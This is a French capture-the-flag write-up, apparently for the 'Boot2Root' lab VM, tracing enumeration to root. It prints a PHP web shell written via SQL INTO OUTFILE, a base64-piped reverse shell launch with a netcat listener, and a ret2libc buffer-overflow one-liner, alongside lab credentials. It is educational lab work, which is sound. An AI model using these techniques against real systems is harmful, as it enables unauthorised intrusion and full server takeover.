# Boot2Root -- Normal Route

## Step 1 - Trouver le serveur
On a pas l'IP du serveur.
On lance un `nmap -sn <mask>` pour énumerer les serveurs qui répondent au ping

Heureusement on trouve une IP différente de la notre qui répond au ping

## Step 2 - Enumerer
### Hote et services
On lance alors on `nmap -p- -A -sV -T4 <ip>` pour obtenir un max d'info sur le serveur

        On y trouve différent services:
        - ftp sur le port 21 (vsftpd 2.0.8 or later)
        - ssh sur le port 22 (OpenSSH 5.9p1)
        - http(s) sur le port 80 et 443 (Apache httpd 2.2.22)
        - imap(s) sur le port 143 et 993 (Dovecot imapd)

        On conserve le log sous le coude au cas ou on puisse en tirer plus d'infos utiles.

### HTTP
        On décide de commencer par le serveur http(s)
        On lance alors `scripts/dirbuster.py` sur le port 80, et on ne tire rien de bien probant pour le moment
        On essaie alors en https, et la on obtient plus d'infos

        Différentes routes
        - `/forum`
        - `/phpmyadmin`
        - `/webmail`
        La plupart des routes nosu donnent des pistes a explorer.

#### PHPMyAdmin
        On décide d'aller vers le plus évident: PHPMyAdmin

        En allant sur la route `/phpmyadmin` on trouve deux infos intéressantes:
        - L'URL de l'image contient un token `token=3e6cab1c9cf8cda6115b523f5d6b353`
        - En cliquant sur le bouton d'aide du formulaire de login, on a accès au numéro de version de PHPMyAdmin
        a savoir `3.4.10.1`

        De la page d'aide on deviner quelques infos supplémentaires
        - PHP version 5.2.0 minimum
        - MySQL Version 5.0 minimum
        - Extension ZIP de PHP

#### Webmail
        On va ensuite voir le webmail
        sur la route `/webmail` on trouve sur la page d'accueil la version `1.4.22`

#### Forum
        On va ensuite voir le forum

        On identifie la brique de forum: `my little forum`
        
        En appuyant sur le lien `Users` on découvre que l'on peut envoyer des mails à `admin`
        Il y a aussi un formulaire de contact, un potentiel endroit a exploiter.

## Step 3 - Poteaux
En énumérant les posts on en voit un appelé `Probleme login ?` qui contient des logs ssh
On peut voir que quelqu'un a pu se connecter en ssh sous l'utilisateur `admin`
et que l'on peut aussi se connecter en tant que `root`.

On liste les différents utilisateurs du forum:
- admin
- lmezard
- qudevide
- zaz
- wandre
- thor

Et on y trouve un mot de passe a la ligne suivante :
` Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`
Autant que la string `!q\]Ej?*5K5cy*AJ` est identifiée comme utilisateur, on devine facilement que ça devrait etre un mot de passe

En essayant ce mdp un peu partout (ssh puis forum) avec tous les users connus,
on trouve que ce mdp appartient à lmezard sur le forum.

En essayant ce mdp un peu partout (ssh puis forum) avec tous les users connus,
on trouve que ce mdp appartient à lmezard sur le forum.

Depuis la page utilisateur de lmezard, on trouve son mail
`laurie@borntosec.net`

On tente alors de se connecter a son webmail via la route `/webmail`
avec le meme mot de passe et ça fonctionne !

on lit le mail `DB Access`, il contient le couple d'identifiants
`root:Fg-'kKXBj87E:aJ$` qui devrait correspondre aux identifiants de la DB, ou de phpmyadmin

on tente alors de se connecter a PHPMyadmin, succes
On explore alors un peu, on tente d'identifer les hash des mots de passe, sans succes
on passe lmezard en admin du forum, ça ne nous aide pas plus...

## Step 4 - Reverse shell

Apres beaucoup de temps a chercher et tenter des trucs, on a une idée:

Utiliser la query console phpmyadmin pour créer un reverse shell php et le lancer via "forum"
Le probleme etant qu'on ne sait pas ou on peux ecrire, ni ou ecrire pour lancer un script

On télécharge alors my little forum a la version correspondante,
trouvée sur la page "update" du mode admin (finalement ça aura servi), qui est `2.3.4`

Et on tente d'explorer l'arborescence du forum, en mirroir avec ce qu'on a téléchargé.
Le seul chemin qui nous permettait à priori de lancer du php est le chemin `/forum/templates_c/<fichier>.php`

On tente alors d'ecrire a cet endroit, d'abord avec un `phpinfo()` pour tester
En supposant que le forum est rangé dans `/var/www/forum`

```SQL
SELECT '<?php phpinfo() ?>' INTO OUTFILE "/var/www/forum/templates_c/info_file.php"
```
Et ça fonctionne ! Acceder a `https://<ip>/forum/templates_c/info_file.php` renvoie bien les infos sur PHP

On fait alors la meme avec un fichier qui va ecouter le query parameter `cmd`,
l'executer dans un shell et nous renvoyer le resultat:

```SQL
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE "/var/www/forum/templates_c/shell.php"
```
(trouvable dans `scripts/shell.php`)

On accede ensuite a `https://<ip>/forum/templates_c/shell.php?cmd=whoami` pour tester si ça fonctionne
on reçoit `www-data` ça fonctionne donc bien.

On sonde un peu pour avoir plus d'infos, notamment la présence ou non de python,
python est bien présent (`which python` retourne un resultat concluant)

On tente alors un script python de reverse shell connu (trouvable dans `scripts/shell.py.sh`),
mais par precaution pour eviter tout soucis avec des caracteres non gérés
on le passe en base64 puis on url encode la commande suivante

```
printf "<reverse shell en base64>" | base64 -d | sh
```
Ça décode code en base64 et puis ça le lance dans shell

De notre coté on lance netcat en mode écoute avec la commande suivante:
```
nc -nlvp <PORT>
```

On lance le script grace a notre fichier PHP et hop, ça fonctionne !

On stabilise le shell a l'aide du protocole suivant:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
puis CTRL-Z
```
stty raw -echo; fg
```
et enfin
```
export TERM=xterm
```

On a maintenant un reverse shell propre sur le serveur.

## Step 5 - Sanitize

Une fois sur le serveur on explore un peu.
Notre première trouvaille intéressante est dans `/home`
on y trouve le dossier `LOOKATME` qui est le seul dossier accessible.
Dedans on voit un fichier `password` nous donnant les credentials suivant:
`lmezard:G!@M6f4Eatau{sF" `

On essaie ses credentials en ssh puis en ftp,
succès sur le ftp. On explore ce qui est a disposition, deux fichiers
`fun` et `README`

On les télécharge sur notre machine et on comprend par le readme que c'est un puzzle
> Complete this little challenge and use the result as password for user 'laurie' to login in ssh

en faisant la commande `file` sur le fichier `fun`, on y comprend que c'est une archive tar.
on l'extrait et on regarde son contenu.

Plein de fichiers PCAP contenant des portions d'un programme en C.
Les fichiers sont dans le désordre mais son numérotés.
A l'aide de du script `merge.py` on remet les fichiers dans l'ordre et on les concatene
dans un seul fichier.

On retire les données poubelles avec `sanitize.sh`, et encore un peu de traitement a la main.
On compile le programme et hop

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

on s'execute et ça fonctionne, on est connectés en ssh en tant que laurie
(mdp: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`)

Depuis le compte de laurie, on trouve deux fichiers, bomb et readme, encore une enignme.

## Step 6 - Da bomb
La bombe a 6 niveaux, chaque niveau a son code. Le mot de passe de thor correspond
aux 6 codes cote a cote.

Notre premier reflexe est de décompile le code avec radare2 et gihdra, selon nos préférences.

Certains niveaux sont plutot simples, ne constituent que d'une string écrite en clair
d'autres sont des algorithmes plus complexes.

Nous avons porté les codes dans le script `defuser.py`. Celui contient ou les solutions en dur
ou l'algorithme inversé qui permet d'obtenir le code.

Le seul vraiment complexe est le niveau 6, nous avons deviné qu'il fallait
une combinaison de 6 chiffres uniques allant de 1 a 6 inclus.

Nous avons alors mis en place un script qui désamorce la bombe, en tentant
les combinaisons possibles. Petit hic, bien que la bombe soit désarmocée
le mot de passe ne fonctionne pas...
(voir `defuser.bash` et `defuser.py`)

### Secret phase
Après pas mal d'essais et de dépatouillage:

En regardant le code décompilé, nous avons constaté qu'il existe une phase secrete
accessible en rajoutant "austinpowers" a la 4eme phase

On a pas trouvé le mdp de la phase secrete, mais en tentant des substitutions du mot de passe
de la 6 on trouve ce mot de passe pour thor:

`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
Cette partie est très étrange et personne n'a réellement trouvé d'eux même,
A chaque fois, le mot de passe apparait par magie...

## Step 7 - Tourne et retourne

On lit un fichier avec des instructions,
Le nom du fichier et les instructions nous permettent facilement de deviner qu'il s'agit
de code pour la librairie `turtle` de `python`. On convertit alors les instructions en code
avec quelques coups de `sed`, on lance et on lit `SLASH`.

La fin du fichier nous dit
> Can you digest this message

On devine qu'on doit faire un digest md5 du message, ça nous donne le mdp
`646da671ca01bb5d84dbb5fb2238dc8e` pour zaz.

Super nickel !

## Step 8 - Piscine a débordement

On trouve un binaire nommé `exploit_me`.
En le décompilant on constate que ça ne fait que `strcopy` l'entrée utilisateur
dans un buffer limité et ça le print. C'est la porte d'entrée pour un buffer overflow.

On s'instruit sur comment faire.
Avec un peu d'exploration avec radare2 et gdb on choppe l'addresse de `system()` et de `/bin/sh`

Ce qui nous donne ce shellcode:
```
./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7AAAA\x58\xcc\xf8\xb7')"`
```

Et bim on est root.

## Sources
Buffer overflow: https://beta.hackndo.com/buffer-overflow/
Oneliners de reverse shell: https://0xss0rz.github.io/2020-05-10-Oneliner-shells/
Stabiliser un reverse shell: https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
